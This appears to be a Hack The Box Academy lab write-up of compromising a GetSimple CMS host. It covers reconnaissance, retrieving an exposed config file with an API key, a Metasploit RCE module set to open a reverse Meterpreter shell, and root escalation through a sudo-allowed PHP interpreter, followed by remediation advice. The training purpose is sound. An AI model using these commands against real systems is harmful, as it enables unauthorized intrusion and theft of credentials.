<img width="1317" height="492" alt="image" src="https://github.com/user-attachments/assets/46d50da5-34a1-4dc2-9f78-e6d9950af452" />

# Hack The Box Academy — Getting Started

## Module Completion

**Status:** Completed ✅  
**Platform:** Hack The Box Academy  
**Module:** Getting Started  
**Final Lab:** Knowledge Check  
**Operating System:** Linux (Ubuntu)  
**Target Application:** GetSimple CMS  
**Focus:** Reconnaissance, Web Exploitation, Initial Foothold, and Privilege Escalation

## Overview

This repository documents my practical learning experience while completing the **Getting Started** module on Hack The Box Academy.

The module introduced fundamental penetration testing methodologies and provided hands-on experience with Linux environments, network reconnaissance, web application enumeration, vulnerability identification, exploitation, and privilege escalation.

During the final Knowledge Check, I performed an end-to-end penetration test against a vulnerable Linux machine.

The objective was to gain initial access, locate the user flag, identify a privilege escalation vulnerability, and obtain root-level access.

All testing was performed within an authorized Hack The Box training environment.

---

## 1. Network Reconnaissance

I began by scanning the target machine to identify open ports, running services, and potential entry points.

### Nmap

```bash
nmap -sC -sV -p- --min-rate 1000 10.129.140.209 -oN knowledge-check-nmap.txt
```

**Parameters:**

- `-sC`: Run default Nmap scripts.
- `-sV`: Detect service versions.
- `-p-`: Scan all TCP ports.
- `--min-rate 1000`: Request a minimum packet transmission rate.
- `-oN`: Save results in normal text format.

### Results

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

The HTTP enumeration also identified a GetSimple CMS installation and an administrative directory at `/admin/`.

---

## 2. Web Application Enumeration

I used WhatWeb to identify technologies running on the web server.

```bash
whatweb http://10.129.140.209
```

The results confirmed Apache 2.4.41 on Ubuntu, while the page content identified the GetSimple CMS application.

### Virtual Host Identification

Further investigation revealed the domain:

```text
gettingstarted.htb
```

I configured local hostname resolution:

```bash
echo '10.129.140.209 gettingstarted.htb' | sudo tee -a /etc/hosts
```

This allowed the application to be accessed using its configured hostname.

### Sensitive File Exposure

I also tested access to an application configuration file:

```bash
curl -i http://gettingstarted.htb/data/other/authorization.xml
```

The server returned `HTTP/1.1 200 OK` and exposed an XML document containing an API key.

This demonstrated an information disclosure weakness in the application's configuration.

---

## 3. Vulnerability Research

After identifying GetSimple CMS, I used SearchSploit to locate known vulnerabilities.

```bash
searchsploit getsimple
```

The results included:

```text
GetSimpleCMS - Unauthenticated Remote Code Execution
```

I then selected the corresponding Metasploit module for further testing.

---

## 4. Initial Foothold — Metasploit

### Starting Metasploit

```bash
msfconsole -q
```

### Selecting the Exploit

```text
use exploit/multi/http/getsimplecms_unauth_code_exec
```

### Configuring the Exploit

```text
set RHOSTS 10.129.140.209
set LHOST 10.10.15.10
set RPORT 80
set TARGETURI /
set PAYLOAD php/meterpreter/reverse_tcp
```

### Executing the Exploit

```text
exploit
```

The exploitation successfully established a Meterpreter session.

### Identifying the Current User

```text
getuid
```

**Result:**

```text
Server username: www-data
```

This confirmed initial access through the vulnerable web application.

---

## 5. Linux Enumeration and User Flag

After obtaining a Meterpreter session, I opened a Linux system shell:

```text
shell
```

I then enumerated the local home directories:

```bash
ls -la /home
```

This revealed a local account named `mrb3n`.

Further inspection:

```bash
ls -la /home/mrb3n
```

Identified the user flag:

```text
/home/mrb3n/user.txt
```

I retrieved it using:

```bash
cat /home/mrb3n/user.txt
```

The flag value is intentionally omitted from this documentation.

---

## 6. Privilege Escalation — Sudo Misconfiguration

After gaining initial access, I investigated the permissions available to the `www-data` account.

### Sudo Enumeration

```bash
sudo -l
```

The result revealed:

```text
(ALL : ALL) NOPASSWD: /usr/bin/php
```

This configuration allowed the web server account to execute the PHP interpreter with elevated privileges without providing a password.

### Privilege Escalation Technique

```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
```

**Explanation:**

- `sudo`: Executes the permitted program with elevated privileges.
- `/usr/bin/php`: Launches the PHP interpreter.
- `-r`: Executes inline PHP code.
- `system("/bin/bash")`: Launches a Bash shell.

Because the PHP interpreter was allowed to run as root, this configuration created a privilege escalation path.

### Verification and Root Flag

The final verification commands were:

```bash
id
cat /root/root.txt
```

The root flag is intentionally excluded from the public write-up.

---

## 7. Attack Chain

```text
Network Reconnaissance
        |
        v
Nmap Service Enumeration
        |
        v
GetSimple CMS Identification
        |
        v
SearchSploit Vulnerability Research
        |
        v
Metasploit Unauthenticated RCE
        |
        v
Meterpreter Session (www-data)
        |
        v
Linux Filesystem Enumeration
        |
        v
User Flag Discovery
        |
        v
Sudo Permission Enumeration
        |
        v
Insecure PHP Sudo Configuration
        |
        v
Root Privilege Escalation
```

---

## 8. Security Findings and Recommendations

### Finding 1 — Remote Code Execution

**Risk:** An attacker may obtain unauthorized command execution through a vulnerable CMS installation.

**Recommendations:**
- Update the CMS and its components.
- Remove unnecessary or vulnerable plugins.
- Restrict administrative access.
- Apply security patches promptly.

### Finding 2 — Sensitive Configuration Exposure

**Risk:** Public access to application configuration files may expose sensitive information.

**Recommendations:**
- Block web access to sensitive application directories.
- Restrict file permissions.
- Rotate exposed credentials and API keys.
- Review web server configuration.

### Finding 3 — Insecure Sudo Configuration

**Risk:** Allowing a web server account to execute an unrestricted interpreter as root creates a direct privilege escalation opportunity.

**Recommendations:**
- Apply the principle of least privilege.
- Remove unnecessary `NOPASSWD` permissions.
- Avoid allowing privileged execution of general-purpose interpreters.
- Audit sudo rules regularly.

---

## 9. Tools and Technologies

| Tool | Purpose |
|---|---|
| Nmap | Network and service enumeration |
| WhatWeb | Web technology fingerprinting |
| SearchSploit | Public vulnerability research |
| Metasploit Framework | Exploitation |
| Meterpreter | Post-exploitation session management |
| Linux CLI | Filesystem and privilege enumeration |
| PHP | Interpreter involved in privilege escalation |

---

## 10. Key Learning Outcomes

Completing this module strengthened my understanding of:

- Penetration testing methodology.
- Network and web reconnaissance.
- Vulnerability identification and exploitation.
- Reverse connections and Meterpreter sessions.
- Linux user accounts and permissions.
- Sudo misconfigurations and privilege escalation.
- Building and documenting a complete attack chain.

### Final Reflection

This lab demonstrated how multiple security weaknesses can be chained together to achieve a complete system compromise.

It also reinforced the importance of structured enumeration, understanding exploitation techniques, and documenting technical findings clearly.

**Next Goal:** Continue progressing through Hack The Box Academy and developing practical skills toward the HTB Certified Penetration Testing Specialist (CPTS) certification.

---

**Disclaimer:** This write-up is intended exclusively for cybersecurity education and authorized penetration testing. All commands were used in a controlled Hack The Box training environment.
